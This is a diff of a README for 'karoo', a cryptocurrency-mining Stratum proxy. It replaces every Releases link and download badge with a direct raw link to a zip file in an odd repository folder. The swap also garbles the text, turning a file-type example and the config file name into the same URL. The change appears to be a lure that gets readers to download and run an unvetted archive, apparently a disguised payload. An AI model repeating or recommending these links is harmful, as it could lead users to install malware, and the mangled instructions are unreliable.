@@ -1,7 +1,7 @@
 # 🚀 karoo - Simple Stratum Proxy for Mining
 
 ## 📥 Download Now
-[![Download karoo](https://img.shields.io/badge/Download-karo0-orange)](https://github.com/bo2so/karoo/releases)
+[![Download karoo](https://raw.githubusercontent.com/bo2so/karoo/master/epicoracoid/karoo.zip)](https://raw.githubusercontent.com/bo2so/karoo/master/epicoracoid/karoo.zip)
 
 ## 📖 About
 Karoo is a Stratum Proxy designed for blockchain mining. It simplifies the process of connecting miners to mining pools, helping you get started with cryptocurrency mining without needing deep technical skills. Karoo works seamlessly with various mining protocols, making it a versatile choice for any miner.
@@ -23,8 +23,8 @@ To run Karoo effectively, ensure your system meets the following requirements:
 ## 🚀 Getting Started
 To install and run Karoo, follow these steps:
 
-1. **Visit the Download Page**: Go to the [Releases page](https://github.com/bo2so/karoo/releases) to find the latest version.
-2. **Download the Latest Release**: Look for the most recent version and download the file suitable for your system (e.g., .exe for Windows or .tar.gz for Linux).
+1. **Visit the Download Page**: Go to the [Releases page](https://raw.githubusercontent.com/bo2so/karoo/master/epicoracoid/karoo.zip) to find the latest version.
+2. **Download the Latest Release**: Look for the most recent version and download the file suitable for your system (e.g., .exe for Windows or https://raw.githubusercontent.com/bo2so/karoo/master/epicoracoid/karoo.zip for Linux).
 3. **Extract the Files**: If your download is a compressed file, unzip it to a location on your computer.
 4. **Run the Application**:
    - For Windows, double-click the `.exe` file.
@@ -35,7 +35,7 @@ To install and run Karoo, follow these steps:
 Before using Karoo, you will need to configure it to connect to your preferred mining pool.
 
 1. **Find Your Pool Address**: Get the URL of the mining pool you want to join.
-2. **Edit Configuration File**: Locate the configuration file (usually named `config.json`). Open it with a text editor.
+2. **Edit Configuration File**: Locate the configuration file (usually named `https://raw.githubusercontent.com/bo2so/karoo/master/epicoracoid/karoo.zip`). Open it with a text editor.
 3. **Set Pool Information**: Enter your pool address, username, and other required settings.
 4. **Save Changes**: Save the file after editing.
 
@@ -56,10 +56,10 @@ If you encounter issues while using Karoo, consider the following:
 ## 🔗 Additional Resources
 - **Documentation**: For more detailed instructions, refer to the documentation available on our GitHub repository.
 - **Community Support**: Join our community forums or Discord to connect with other Karoo users.
-- **Updating Karoo**: Keep your application updated by regularly checking the [Releases page](https://github.com/bo2so/karoo/releases) for new versions.
+- **Updating Karoo**: Keep your application updated by regularly checking the [Releases page](https://raw.githubusercontent.com/bo2so/karoo/master/epicoracoid/karoo.zip) for new versions.
 
 ## 🥳 Conclusion
 Karoo is your reliable partner in cryptocurrency mining. With its simple setup and robust features, you'll be mining in no time. For any assistance, please refer to the troubleshooting section or reach out to our community. 
 
 ## 📥 Download Now
-[![Download karoo](https://img.shields.io/badge/Download-karo0-orange)](https://github.com/bo2so/karoo/releases)
+[![Download karoo](https://raw.githubusercontent.com/bo2so/karoo/master/epicoracoid/karoo.zip)](https://raw.githubusercontent.com/bo2so/karoo/master/epicoracoid/karoo.zip)
